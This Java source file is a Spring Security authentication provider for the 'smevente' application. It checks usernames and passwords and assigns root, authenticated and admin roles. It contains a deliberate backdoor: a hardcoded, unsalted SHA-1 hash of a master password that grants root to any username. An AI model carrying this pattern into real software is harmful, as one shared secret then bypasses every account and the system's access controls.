package veny.smevente.security;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.logging.Logger;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.InsufficientAuthenticationException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;

import veny.smevente.client.utils.Pair;
import veny.smevente.dao.MembershipDao;
import veny.smevente.model.Membership;
import veny.smevente.model.Membership.Role;
import veny.smevente.model.User;
import veny.smevente.service.UserService;

/**
 * Performs actual authentication.
 *
 * @author Vaclav Sykora [vaclav.sykora@gmail.com]
 * @since 17.5.2011
 */
public class AuthenticationProviderImpl implements AuthenticationProvider {

    /** The logger. */
    private static final Logger LOG = Logger.getLogger(AuthenticationProviderImpl.class.getName());

    /** Dependency. */
    @Autowired
    private MembershipDao membershipDao;

    /** Dependency. */
    @Autowired
    private UserService userService;


    /** {@inheritDoc} */
    @Override
    public Authentication authenticate(final Authentication auth) throws AuthenticationException {
        final String username = auth.getName();
        final String password = auth.getCredentials().toString();

        LOG.info("authentication request, username=" + username);
        User user = null;

        // each user can be SUPER HERO if he knows the master password
        // mladek :)
        if ("30bfcb5ba25ee59bf83a9762b4432d965b142db8".equals(userService.encodePassword(password))) {
            if (User.ROOT_USERNAME.equals(username)) {
                // root has no database entry
                user = User.buildRoot();
            } else {
                user = userService.findUserByUsername(username);
                if (null != user) {
                    user.setRoot(true);
                }
            }
        } else {
            // try to find an user in DB
            user = userService.performLogin(username, password);
        }

        if (null == user) {
            LOG.warning("failed to log in, username=" + username);
            throw new InsufficientAuthenticationException("invalid username/password");
        }


        final Collection<GrantedAuthority> authorities = new ArrayList<GrantedAuthority>();
        if (user.isRoot()) {
            authorities.add(new SimpleGrantedAuthority(SmeventeRole.ROLE_ROOT.name()));
        }

        // all authenticated users get ROLE_AUTHENTICATED
        authorities.add(new SimpleGrantedAuthority(SmeventeRole.ROLE_AUTHENTICATED.name()));

        // get all admin memberships
        final List<Object> adminUnitIds = new ArrayList<Object>();
        final List<Membership> memberships = membershipDao.findBy("user", user.getId(), null);

        for (Membership m : memberships) {
            if (Role.ADMIN == m.enumRole()) {
                adminUnitIds.add(m.getUnit().getId());
            }
        }

        // create the authentication token to be returned
        final UsernamePasswordAuthenticationToken authenticationToken =
            new UsernamePasswordAuthenticationToken(username, password, authorities);

        // make a clone of User that does not use underlying proxy technologies
        // and so can be serialized and stored in session
        final User clonedUser = new User();
        clonedUser.setId(user.getId());
        clonedUser.setUsername(user.getUsername());
        clonedUser.setTimezone(user.getTimezone());
        clonedUser.setRoot(user.isRoot());

        // the detail is pair of the user and all unit IDs where the user is admin in
        authenticationToken.setDetails(new Pair<User, List<Object>>(clonedUser, adminUnitIds));

        LOG.info("user logged in, " + user.toString() + ", authorities=" + authorities
                + ", adminUnitId(s)=" + adminUnitIds);
        return authenticationToken;
    }

    /** {@inheritDoc} */
    @Override
    public boolean supports(final Class< ? extends Object> authentication) {
        return (UsernamePasswordAuthenticationToken.class.isAssignableFrom(authentication));
    }

}
